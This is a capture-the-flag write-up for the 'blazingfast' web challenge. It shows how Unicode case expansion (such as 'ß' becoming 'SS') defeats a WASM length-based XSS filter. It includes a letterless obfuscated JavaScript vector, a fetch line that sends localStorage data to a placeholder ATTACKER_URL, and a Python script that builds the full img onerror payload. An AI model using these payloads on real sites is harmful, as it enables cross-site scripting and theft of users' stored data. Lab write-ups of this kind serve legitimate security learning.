# blazingfast

## Description

> I made a blazing fast MoCkInG CaSe converter!

{% file src="../../.gitbook/assets/blazingfast (1).tar" %}

## Solution

### Code Review

Looking at the site's JavaScript, we can see that the `demo()` function is called on the `demo` GET request parameter, which results in the setting of the `innerHTML` of the `result` element.

```javascript
function demo(str) {
	document.getElementById('result').innerHTML = mock(str);
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {	
	blazingfast = instance.exports;

	document.getElementById('demo-submit').onclick = () => {
		demo(document.getElementById('demo').value);
	}

	let query = new URLSearchParams(window.location.search).get('demo');

	if (query) {
		document.getElementById('demo').value = query;
		demo(query);
	}
})
```

The `mock()` function is a wrapper for the functions exposed by the WASM module. Interestingly, the `str.length` is measured _before_ converting the string to upper case - this leads to [inconsistencies in length measurement of some Unicode characters](https://stackoverflow.com/questions/49895784/change-to-length-with-touppercase).

Another interesting point to note is that when reading from the buffer, `str.length` is not used. Instead, characters are read until a null terminator is reached.

```javascript
function mock(str) {
	blazingfast.init(str.length);

	if (str.length >= 1000) return 'Too long!';

	for (let c of str.toUpperCase()) {
		if (c.charCodeAt(0) > 128) return 'Nice try.';
		blazingfast.write(c.charCodeAt(0));
	}

	if (blazingfast.mock() == 1) {
		return 'No XSS for you!';
	} else {
		let mocking = '', buf = blazingfast.read();

		while(buf != 0) {
			mocking += String.fromCharCode(buf);
			buf = blazingfast.read();
		}

		return mocking;
	}
}
```

Notably, the `mock()` function in the WASM module also uses the initialized `length`, which is set to `str.length` to validate the buffer.&#x20;

Therefore, if the `str.length` is shorter than the actual number of characters written into the buffer, the `mock()` function will not check the entire buffer, allowing the `<>&"` characters.

```c
int length, ptr = 0;
char buf[1000];

void init(int size) {
	length = size;
	ptr = 0;
}

char read() {
	return buf[ptr++];
}

void write(char c) {
	buf[ptr++] = c;
}

int mock() {
	for (int i = 0; i < length; i ++) {
		if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
			buf[i] += 32;
		}

		if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
			return 1;
		}
	}

	ptr = 0;

	return 0;
}
```

### Problematic Unicode

When converting to upper case, some Unicode characters like `ß` turn into multiple characters instead. `ß` is converted to `SS`, which falls within the range of 0 to 128, passing the `if (c.charCodeAt(0) > 128) return 'Nice try.';` check.

![](<../../.gitbook/assets/image (89).png>)

When `str.length` is initialized, the single character `ß` is used to calculate the length. However, when writing to the buffer, two characters `SS` are written instead. This allows us to bypass the XSS validation.&#x20;

For instance, `ß<` will have a length of 2, but is converted to `SS<` when writing to the buffer. The `mock()` function uses the initialized length to iterate through the buffer in the `for (int i = 0; i < length; i ++)` loop, missing out the final `<` character.

### Building the Payload

Our final hurdle lies in the fact that JavaScript is a case-sensitive language, and our payload is converted to upper case before being added to the `innerHTML`. For example, if we use `eval()` as our JavaScript payload, then `EVAL()` will be called - but the `EVAL` function is not defined.

I found inspiration from [this post](https://techiavellian.com/constructing-an-xss-vector-using-no-letters), which shows how we can construct an XSS vector without using letters. In his payload, the following is used to build `""["sub"]["constructor"]("alert(1)")()`.

```javascript
""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+"")[1]+(!1+"")[2]+(!0+"")[3]+(!0+"")[1]+(!0+"")[0])+"(1)")()
```

To modify this payload for our purposes, I just had to change the part where the `"alert(1)"` stirng is constructed, and replace it with octal characters for our JavaScript payload, which was

```javascript
fetch('https://ATTACKER_URL/?' + localStorage.getItem('flag'))
```

The following script generates the XSS payload, using `<img src="x" onerror=PAYLOAD>`.

```python
import urllib.parse

# Obfuscation inspired by https://techiavellian.com/constructing-an-xss-vector-using-no-letters

payload = '<img src="x" onerror=\'""[(!1+"")[3]+(!0+"")[2]+(""+{})[2]][(""+{})[5]+(""+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(""+{})[2]])+"")[2]+(!1+"")[3]+(!0+"")[0]+(!0+"")[1]+(!0+"")[2]+(""+{})[5]+(!0+"")[0]+(""+{})[1]+(!0+"")[1]]("\\146\\145\\164\\143\\150...")()\'>'
special_char = 'ﬃ'

print(urllib.parse.quote_plus(special_char * (len(payload) // 2 + 1) + payload))
```
